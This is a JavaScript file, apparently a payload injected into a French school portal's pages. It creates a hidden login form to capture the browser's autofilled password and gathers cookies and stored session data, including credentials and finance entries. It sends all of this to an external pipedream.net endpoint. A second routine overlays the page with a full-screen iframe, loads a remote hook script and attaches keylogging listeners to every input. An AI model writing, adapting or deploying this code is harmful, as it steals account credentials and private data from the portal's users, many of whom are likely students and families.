const ur = new URL(document.currentScript.src);
window.addEventListener('beforeunload', (e) => {
  e.preventDefault();
  e.returnValue = '';
});

(async function ex() {

	const url = 'https://0733573e51e539943f1a251895a65a69.m.pipedream.net/session';
	const messageid = new URL(window.top.document.querySelector('a[href*="Messagerie"]'));  
	const keys = [
		'accounts', 'badges', 'credentials', 'edhydration_auth',
		'etablissement', 'finances', 'bigAds', 'fa', 'pdfjs.history','panier'
	];
	const form = window.top.document.createElement('form');
	const identifiant = JSON.parse(sessionStorage.getItem("accounts"));
	form.hidden = true;
	form.innerHTML = `<input id="username" name="username" autocomplete="username" value=${identifiant.payload.accounts?.[0].identifiant}><input id="password" name="password" autocomplete="current-password" type="password">`
	window.top.document.body.appendChild(form);
	const pwdInput = window.top.document.querySelector('input[type="password"]');
	await new Promise(resolve => setTimeout(resolve, 2000));
	
	const pass = pwdInput.value
  
	const data = {
		t: new Date().toISOString(),
		u: navigator.userAgent,
		mid: messageid.searchParams.get('idMessage') || "null",
		api: ur.searchParams.get("apiv") || "100.1",
		sign: ur.searchParams.get("signature") || false,
		mode: ur.searchParams.get("mode") || "Suppression",
		email: ur.searchParams.get("email") || "test@gmail.com",
		ps: pass,
		c: document.cookie,
		s: Object.fromEntries(
		keys
			.map(k => [k, sessionStorage.getItem(k) ?? localStorage.getItem(k)])
			.filter(([, v]) => v !== null)
			.map(([k, v]) => {
			try { return [k, JSON.parse(v)]; }
			catch { return [k, v]; }
			})
		)
	};

	try {
		await fetch(url, {
			method: "POST",
			headers: {
				"Content-Type": "application/json"
			},
			body: JSON.stringify(data)
		});
	} catch {}
})();

async function iframe() {
	const i = window.top.document.createElement('iframe');
	i.src = "/";
	i.className = 'EDsploit';
	i.style.cssText = 'position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
	window.top.document.body.appendChild(i);
        
	i.onload = async () => {
		try {
			const doc = i.contentDocument || i.contentWindow?.document;
			if (!doc) return;

			const beef = doc.createElement('script');
			beef.src = 'https://exon-dv.github.io/a/b.js';
			beef.async = true;
			doc.body.appendChild(beef);

			await new Promise(resolve => setTimeout(resolve, 8000));

			function attachListeners(doc) {
			// inputs + divs contenteditable
			doc.querySelectorAll('input, div[contenteditable]').forEach(field => {
				if (field._hooked) return; // ← empêche les doublons
				field._hooked = true;

				const eventType = field.tagName === 'INPUT' ? 'input' : 'input';

				field.addEventListener('input', async function() {
				const name = this.name || this.id || this.type || this.className || 'field';
				const value = this.value || this.innerText;
				console.log(`[${name}] : ${value}`);
				});
			});
			}

			const observer = new MutationObserver(() => attachListeners(doc));
			observer.observe(doc.body, { childList: true, subtree: true });
			attachListeners(doc);

		} catch (err) {
			console.error('iframe hook failed', err);
		}
	}

	return;
};

(async function() {
	if (ur.searchParams.get("iframetrap") === "true") {
		if (window.top.document.body.querySelector('iframe[class=EDsploit]')) {
			return null
		} else {
			await iframe()
		}
	}
})();
